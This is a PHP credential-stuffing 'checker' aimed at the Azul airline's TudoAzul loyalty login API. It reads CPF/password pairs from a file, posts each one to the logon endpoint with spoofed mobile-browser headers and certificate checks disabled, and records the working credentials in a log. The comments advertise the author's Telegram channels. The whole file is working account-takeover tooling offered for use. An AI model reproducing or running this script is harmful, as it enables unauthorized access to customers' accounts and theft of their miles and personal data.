<?php
    error_reporting(0);
    function ApiChecking($cpf,$password){
        /**
         * ! OLÁ TUDO BEM?
         * ! SOU ANTRAZ O DESENVOLVEDOR DO CHECKING DA AZUL MILHAS...
         * ! QUAL QUER COISA E DUVIDAS ME CHAMA NO TELEGRAM...
         * ! https://t.me/Antrazs
         * ! https://t.me/AntrazCentral
         */
        $date = date('d/m/Y H:i:s');
        $http =[ 
            'Host: webservices.voeazul.com.br',
            'Content-Type: application/json;charset=utf-8',
            'Accept: application/json, text/plain, */*',
            'Sec-Fetch-Site: same-site',
            'Sec-Fetch-Mode: cors',
            'Origin: https://apps.voeazul.com.br',
            'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1',
            'Referer: https://apps.voeazul.com.br/',
            'Sec-Fetch-Dest: empty',
        ];
        $post = '{"username":"'.$cpf.'","password":"'.$password.'"}';
        $curl = curl_init();
        curl_setopt_array($curl,[
            CURLOPT_URL => "https://webservices.voeazul.com.br/TudoAzulClubApi/api/Auth/logon",
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_TIMEOUT => 60,
            CURLOPT_CUSTOMREQUEST => "POST",
            CURLOPT_HTTPHEADER => $http,
            CURLOPT_POSTFIELDS => $post
        ]);
        $result = curl_exec($curl);
        curl_close($curl);
        $result =  json_decode($result, true);
        sleep(0.5);
        if($result['LoginComarchDisable']==true){
            echo"\e[0;32;42m[ • ] \e[0m\e[0;42m LOGIN SUCESSO: $cpf | $password | [ TELEGRAM: @Antrazs ] | [ $date ]"."\e[0m\e[0;32;42m[ • ] \e[0m\n";
            $FirstName = $result["Person"]["FirstName"];
            $LastName = $result["Person"]["LastName"];
            $CustomerNumber = $result["Person"]["CustomerNumber"];
            $DocumentNumber = $result["Person"]["DocumentNumber"];
            $Email = $result["Person"]["Email"];
            $DateOfBirth = $result["Person"]["DateOfBirth"];
            $dir = "./db/log/".date('d_m_Y');
            $file = "./db/log/".date('d_m_Y')."/login.txt";
            if(!is_dir($dir)){
                mkdir($dir);
            }
            $file_save = fopen($file, "a+");
            fwrite($file_save,$cpf."|".$password."\n");
            fclose($file_save);
        }else{
            echo"\e[1;31;41m[ • ] \e[0m\e[0;41m LOGIN INCORRETO: $cpf | $password | [ TELEGRAM: @Antrazs ] | [ $date ]"."\e[0m\e[1;31;41m[ • ] \e[0m\n";

        }
    }
    function Api($file){
        $date = date('d/m/Y H:i:s');
        $file = fopen("./key/$file",'r');
        while ($line = fgets($file)) {
            $explode = explode("|",$line);
            $id = trim($explode[0]);
            $pass = trim($explode[1]);
            $pass = trim($explode[1]);
            if(is_numeric($id)){
                ApiChecking($id,$pass);
                sleep(1.5);
            }
        }
        fclose($file);
    }
    Api("s.txt")
?>